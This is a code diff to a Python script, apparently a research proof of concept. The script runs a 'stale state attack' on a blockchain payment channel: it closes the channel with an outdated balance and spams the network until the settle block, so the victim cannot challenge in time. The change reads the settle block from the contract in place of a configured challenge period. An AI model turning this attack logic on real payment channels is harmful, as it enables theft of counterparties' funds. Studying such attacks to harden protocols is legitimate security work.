@@ -17,7 +17,7 @@ from web3 import Web3, HTTPProvider
 from spamming import SpamManager
 import logging, click, datetime
 
-def cheat_and_spam(channel, private_key: str = config.PRIVATE_KEY, challenge_period: int = config.CHALLENGE_PERIOD):
+def cheat_and_spam(channel, private_key: str = config.PRIVATE_KEY):
     '''
     Performs a stale state attack on the given channel. 
     Assumes that the given channel's balance is > 0. Closes the channel with balance 0 
@@ -42,14 +42,16 @@ def cheat_and_spam(channel, private_key: str = config.PRIVATE_KEY, challenge_per
     )
     spam_manager.start()
 
-
     # Wait for channel to be closed
     closed_event = wait_for_close(channel)
     logging.info('Channel closed at block #{}'.format(closed_event['blockNumber']))
 
+    # Get block number when channel can be settled
+    _, _, settle_block, _, _ = channel.core.channel_manager.call().getChannelInfo(
+        channel.sender, channel.receiver, channel.block
+    )
     # Update target block for spamming thread
-    target_block = closed_event['blockNumber'] + challenge_period
-    spam_manager.update_target_block(target_block)
+    spam_manager.update_target_block(settle_block)
     
     # Wait for channel to be settled
     settled_event = wait_for_settle(channel)
@@ -119,7 +121,7 @@ def main(rpcport: int):
     send_payment(channel=channel, amount=amount)
 
     # Start stale state attack
-    cheat_and_spam(channel=channel, private_key=config.PRIVATE_KEY, challenge_period=config.CHALLENGE_PERIOD)
+    cheat_and_spam(channel=channel, private_key=config.PRIVATE_KEY)
 
 if __name__ == '__main__':
     logging.basicConfig(level=logging.INFO)
